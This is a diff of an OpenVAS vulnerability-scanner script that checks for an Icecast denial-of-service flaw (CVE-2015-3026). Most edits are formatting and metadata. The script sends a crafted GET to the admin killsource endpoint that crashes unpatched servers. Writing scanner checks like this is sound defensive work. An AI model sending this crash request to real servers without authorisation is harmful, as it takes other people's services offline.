@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_icecast_stream_auth_handler_dos_vuln.nasl 9335 2018-04-05 13:50:33Z cfischer $
+# $Id: gb_icecast_stream_auth_handler_dos_vuln.nasl 11291 2018-09-07 14:48:41Z mmartin $
 #
 # Icecast 'stream_auth' handler Denial of Service Vulnerability
 #
@@ -27,41 +27,41 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.805177");
-  script_version("$Revision: 9335 $");
+  script_version("$Revision: 11291 $");
   script_cve_id("CVE-2015-3026");
   script_bugtraq_id(73965);
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2018-04-05 15:50:33 +0200 (Thu, 05 Apr 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-07 16:48:41 +0200 (Fri, 07 Sep 2018) $");
   script_tag(name:"creation_date", value:"2015-05-07 12:58:34 +0530 (Thu, 07 May 2015)");
   script_tag(name:"qod_type", value:"remote_vul");
   script_name("Icecast 'stream_auth' handler Denial of Service Vulnerability");
 
-  script_tag(name: "summary" , value:"The host is running Icecast and is prone
+  script_tag(name:"summary", value:"The host is running Icecast and is prone
   to remote denial of service vulnerability.");
 
-  script_tag(name: "vuldetect" , value:"Send a crafted request via HTTP GET
+  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET
   and check whether it is able to crash or not.");
 
-  script_tag(name: "insight" , value:"A NULL pointer dereference flaw is
+  script_tag(name:"insight", value:"A NULL pointer dereference flaw is
   triggered if 'stream_auth' handler is defined for URL authentication.");
 
-  script_tag(name: "impact" , value:"Successful exploitation may allow remote
+  script_tag(name:"impact", value:"Successful exploitation may allow remote
   attackers to cause the application to crash, creating a denial-of-service
   condition.
 
   Impact Level: Application");
 
-  script_tag(name: "affected" , value:"Icecast version before 2.4.2");
+  script_tag(name:"affected", value:"Icecast version before 2.4.2");
 
-  script_tag(name: "solution" , value:"Update to version 2.4.2 or later,
+  script_tag(name:"solution", value:"Update to version 2.4.2 or later,
   For updates refer http://xiph.org");
 
   script_tag(name:"solution_type", value:"VendorFix");
 
-  script_xref(name : "URL" , value : "https://trac.xiph.org/ticket/2191");
-  script_xref(name : "URL" , value : "http://www.openwall.com/lists/oss-security/2015/04/08/11");
-  script_xref(name : "URL" , value : "http://lists.xiph.org/pipermail/icecast-dev/2015-April/002460.html");
+  script_xref(name:"URL", value:"https://trac.xiph.org/ticket/2191");
+  script_xref(name:"URL", value:"http://www.openwall.com/lists/oss-security/2015/04/08/11");
+  script_xref(name:"URL", value:"http://lists.xiph.org/pipermail/icecast-dev/2015-April/002460.html");
 
   script_category(ACT_DENIAL);
   script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
@@ -75,22 +75,15 @@ if(description)
 include("http_func.inc");
 include("http_keepalive.inc");
 
-## Variable Initialization
-http_port = "";
-sndReq = "";
-rcvRes = "";
-
 http_port = get_http_port(default:8000);
 
 rcvRes = http_get_cache(item: "/",  port:http_port);
 
-## confirm the Application
 if(">Icecast Streaming Media Server" >< rcvRes)
 {
   sndReq = http_get(item: "/admin/killsource?mount=/test.ogg",  port:http_port);
   rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);
 
-  ## Get request to check whether application is crashed or not
   sndReq = http_get(item: "/",  port:http_port);
   rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);
 
